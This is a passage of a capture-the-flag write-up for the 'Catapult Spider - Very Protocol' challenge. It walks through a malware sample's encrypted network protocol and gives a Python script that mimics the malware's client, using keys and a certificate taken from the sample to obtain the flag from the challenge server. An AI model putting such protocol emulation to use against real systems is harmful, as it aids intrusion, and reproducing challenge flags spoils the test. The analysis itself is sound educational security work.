+<p>The encryption method used is AES, in CBC-128 mode:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>    <span class="nx">_encrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">iv</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">alloc</span><span class="p">(</span><span class="mf">16</span><span class="p">,</span> <span class="mf">0</span><span class="p">);</span>
+        <span class="kd">var</span> <span class="nx">wow_cripter</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createCipheriv</span><span class="p">(</span><span class="s1">&#39;aes-128-cbc&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">aes_key</span><span class="p">,</span> <span class="nx">iv</span><span class="p">);</span>
+        <span class="nx">wow_cripter</span><span class="p">.</span><span class="nx">setAutoPadding</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">concat</span><span class="p">([</span><span class="nx">wow_cripter</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">data</span><span class="p">),</span> <span class="nx">wow_cripter</span><span class="p">.</span><span class="kr">final</span><span class="p">()]);</span>
+    <span class="p">};</span>
+    <span class="nx">_decrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">iv</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">alloc</span><span class="p">(</span><span class="mf">16</span><span class="p">,</span> <span class="mf">0</span><span class="p">);</span>
+        <span class="kd">var</span> <span class="nx">wow_decripter</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createDecipheriv</span><span class="p">(</span><span class="s1">&#39;aes-128-cbc&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">aes_key</span><span class="p">,</span> <span class="nx">iv</span><span class="p">);</span>
+        <span class="nx">wow_decripter</span><span class="p">.</span><span class="nx">setAutoPadding</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">concat</span><span class="p">([</span><span class="nx">wow_decripter</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">data</span><span class="p">),</span> <span class="nx">wow_decripter</span><span class="p">.</span><span class="kr">final</span><span class="p">()]);</span>
+    <span class="p">};</span>
+</code></pre></div>
+</td></tr></table>
+<p>The meat of the network protocl is in the <code>send()</code> and <code>_send()</code> methods:</p>
+<p><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>112
+113
+114
+115
+116
+117
+118
+119
+120
+121</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>    <span class="nx">send</span><span class="p">(</span><span class="nx">message</span><span class="p">)</span> <span class="p">{</span>
+<span class="hll">        <span class="kd">let</span> <span class="nx">hmac</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">hmac_key</span><span class="p">);</span>
+</span>        <span class="kd">let</span> <span class="nx">mbuf</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">_encrypt</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
+<span class="hll">        <span class="nx">hmac</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">mbuf</span><span class="p">);</span>
+</span><span class="hll">        <span class="kd">let</span> <span class="nx">chksum</span> <span class="o">=</span> <span class="nx">hmac</span><span class="p">.</span><span class="nx">digest</span><span class="p">();</span>
+</span><span class="hll">        <span class="kd">let</span> <span class="nx">buffer</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">concat</span><span class="p">([</span><span class="nx">chksum</span><span class="p">,</span> <span class="nx">mbuf</span><span class="p">]);</span>
+</span>        <span class="k">this</span><span class="p">.</span><span class="nx">_header</span><span class="p">(</span><span class="nx">buffer</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">_packet</span><span class="p">.</span><span class="nx">message</span> <span class="o">=</span> <span class="nx">buffer</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">_send</span><span class="p">();</span>
+    <span class="p">};</span>
+</code></pre></div>
+</td></tr></table>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>139
+140
+141
+142
+143
+144
+145</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>    <span class="nx">_send</span><span class="p">()</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">contentLength</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">allocUnsafe</span><span class="p">(</span><span class="mf">4</span><span class="p">);</span>
+        <span class="nx">contentLength</span><span class="p">.</span><span class="nx">writeUInt32BE</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_packet</span><span class="p">.</span><span class="nx">header</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">socket</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">contentLength</span><span class="p">);</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">socket</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_packet</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">_packet</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="p">};</span>
+</code></pre></div>
+</td></tr></table></p>
+<p>The message is encrypted with the AES keys created in <code>init()</code> method, then an HMAC
+of the encrypted content is generated and is prepended to the message. The message is
+actually sent in the <code>_send()</code> method, which first writes an unsigned 32-bit number
+containing the length of the message to the socket, then the message itself. </p>
+<p>Incoming messages are handled in reverse, in the <code>_parseMessage()</code> function. The checksum
+passed with the message is stripped from the beginning, a new checksum is generated to compare
+against the received one, and if the checksums match, the message is decrypted and returned
+to the server.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>    <span class="nx">_parseMessage</span><span class="p">(</span><span class="nx">received</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">hmac</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">hmac_key</span><span class="p">);</span>
+        <span class="kd">var</span> <span class="nx">checksum</span> <span class="o">=</span> <span class="nx">received</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="mf">32</span><span class="p">)</span>
+            <span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
+        <span class="kd">var</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">received</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mf">32</span><span class="p">);</span>
+        <span class="nx">hmac</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
+        <span class="kd">let</span> <span class="nx">stupid</span> <span class="o">=</span> <span class="nx">hmac</span><span class="p">.</span><span class="nx">digest</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">checksum</span> <span class="o">===</span> <span class="nx">stupid</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">dec_message</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">_decrypt</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
+            <span class="k">this</span><span class="p">.</span><span class="nx">socket</span><span class="p">.</span><span class="nx">emit</span><span class="p">(</span><span class="s1">&#39;served&#39;</span><span class="p">,</span> <span class="nx">dec_message</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">};</span>
+</code></pre></div>
+</td></tr></table>
+<p>With all of these pieces, we can build a Python script to emulate the malware's communication with
+the server:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+
+<span class="c1"># CATAPULT SPIDER malware protocol</span>
+<span class="c1">#</span>
+<span class="c1"># Joe Ammond (pugpug) @joeammond</span>
+
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="kn">from</span> <span class="nn">Crypto.Protocol.KDF</span> <span class="kn">import</span> <span class="n">PBKDF2</span>
+<span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">SHA512</span><span class="p">,</span> <span class="n">SHA256</span><span class="p">,</span> <span class="n">HMAC</span>
+<span class="kn">from</span> <span class="nn">Crypto.Random</span> <span class="kn">import</span> <span class="n">get_random_bytes</span>
+<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+
+<span class="c1"># Create the HMAC and AES keys</span>
+<span class="n">salty_wow</span>   <span class="o">=</span> <span class="s1">&#39;suchdoge4evawow&#39;</span>
+<span class="n">hmac_wow</span>    <span class="o">=</span> <span class="s1">&#39;such doge is yes wow&#39;</span>
+<span class="n">aes_wow</span>     <span class="o">=</span> <span class="s1">&#39;such doge is shibe wow&#39;</span>
+
+<span class="n">hmac_key</span>    <span class="o">=</span> <span class="n">PBKDF2</span><span class="p">(</span><span class="n">hmac_wow</span><span class="p">,</span> <span class="n">salty_wow</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">4096</span><span class="p">,</span> <span class="n">hmac_hash_module</span><span class="o">=</span><span class="n">SHA256</span><span class="p">)</span>
+<span class="n">aes_key</span>     <span class="o">=</span> <span class="n">PBKDF2</span><span class="p">(</span><span class="n">aes_wow</span><span class="p">,</span> <span class="n">salty_wow</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">4096</span><span class="p">,</span> <span class="n">hmac_hash_module</span><span class="o">=</span><span class="n">SHA256</span><span class="p">)</span>
+
+<span class="c1"># Who we communicate with</span>
+<span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;veryprotocol.challenges.adversary.zone&#39;</span>
+
+<span class="c1"># Client certificate and private key, from the malware executable</span>
+<span class="n">ssl_opts</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;keyfile&#39;</span><span class="p">:</span>  <span class="s1">&#39;doge_key&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;certfile&#39;</span><span class="p">:</span> <span class="s1">&#39;doge_cert&#39;</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="c1"># Encrypt the message, and prepend the HMAC</span>
+<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">iv</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">16</span>
+    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">aes_key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="o">=</span><span class="n">iv</span><span class="p">)</span>
+
+    <span class="n">length</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">length</span><span class="p">])</span><span class="o">*</span><span class="n">length</span>
+
+    <span class="n">enc</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="n">hmac</span> <span class="o">=</span> <span class="n">HMAC</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">hmac_key</span><span class="p">,</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">SHA256</span><span class="p">)</span>
+    <span class="n">hmac</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
+
+    <span class="n">digest</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+
+    <span class="k">return</span> <span class="p">(</span><span class="n">digest</span> <span class="o">+</span> <span class="n">enc</span><span class="p">)</span>
+
+<span class="c1"># Decrypt the message, and verify that the HMAC matches</span>
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">checksum</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="mi">32</span><span class="p">]</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+    <span class="n">message</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">32</span><span class="p">:]</span>
+
+    <span class="n">hmac</span> <span class="o">=</span> <span class="n">HMAC</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">hmac_key</span><span class="p">,</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">SHA256</span><span class="p">)</span>
+    <span class="n">hmac</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+
+    <span class="n">verify</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="n">checksum</span> <span class="o">==</span> <span class="n">verify</span><span class="p">:</span>
+        <span class="n">iv</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">16</span>
+        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">aes_key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="o">=</span><span class="n">iv</span><span class="p">)</span>
+        <span class="n">plaintext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+        <span class="k">return</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s1">&#39;bonk&#39;</span>
+
+<span class="c1"># Main loop: read a DSON string, encrypt it, send it to the server,</span>
+<span class="c1"># receive the response, print it.</span>
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+
+    <span class="c1"># Read a string</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s1">&#39;Shibe sez? &#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+
+    <span class="c1"># Shibe sez quit</span>
+    <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="s1">&#39;quit&#39;</span><span class="p">:</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="c1"># Connect to the server</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="mi">41414</span><span class="p">,</span> <span class="n">ssl</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">ssl_args</span><span class="o">=</span><span class="n">ssl_opts</span><span class="p">)</span>
+
+    <span class="c1"># Encrypt it</span>
+    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+
+    <span class="c1"># Send the message length as u32, then the message</span>
+    <span class="n">length</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">),</span> <span class="n">endianness</span><span class="o">=</span><span class="s2">&quot;big&quot;</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="s2">&quot;unsigned&quot;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
+
+    <span class="c1"># Read the response length, and the message</span>
+    <span class="n">length</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+    <span class="c1"># Decrypt the message and print it</span>
+    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">()</span>
+</code></pre></div>
+</td></tr></table>
+<p>The code is fairly straightforward. To retrieve the key from the server, we can use the 
+<code>cript()</code> function with the <code>cript_key</code> value generated by the server. Running XOR on the
+<code>secrit_key</code> with the <code>cript_key</code> reverses the "encryption", revealing the original
+value of the <code>CRYPTZ</code> environment variable:</p>
+<div class="highlight"><pre><span></span><code>(pwn) xps15$ python3 hammer.py
+Shibe sez? such &quot;dogesez&quot; is &quot;do me a favor&quot; next &quot;ohmaze&quot; is &quot;cript(secrit_key, cript_key)&quot; wow
+[+] Opening connection to veryprotocol.challenges.adversary.zone on port 41414: Done
+[+] Receiving all data: Done (128B)
+[*] Closed connection to veryprotocol.challenges.adversary.zone port 41414
+b&#39;such &quot;dogesez&quot; is &quot;welcome&quot; next &quot;ohmaze&quot; is &quot;CS{such_Pr0t0_is_n3tw0RkS_w0W}&quot; wow\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f&#39;
+</code></pre></div>
+<p>And there's the flag: CS{such_Pr0t0_is_n3tw0RkS_w0W}.</p>
+<h2 id="answer">Answer<a class="headerlink" href="#answer" title="Permanent link">#</a></h2>
+<p><strong><code>CS{such_Pr0t0_is_n3tw0RkS_w0W}</code></strong></p>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../muchsad/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Catapult Spider - Much Sad
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../../conclusion/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Conclusion
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Joe Ammond - <a href="http://twitter.com/joeammond">@joeammond</a>
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+  <div class="md-footer-social">
+    
+      
+      
+        
+        
+      
+      <a href="https://twitter.com/joeammond" target="_blank" rel="noopener" title="twitter.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://www.linkedin.com/in/joeammond/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://github.com/joeammond" target="_blank" rel="noopener" title="github.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+      </a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/vendor.08c56446.min.js"></script>
+      <script src="../../assets/javascripts/bundle.6ced434e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../..",
+          features: [],
+          search: Object.assign({
+            worker: "../../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
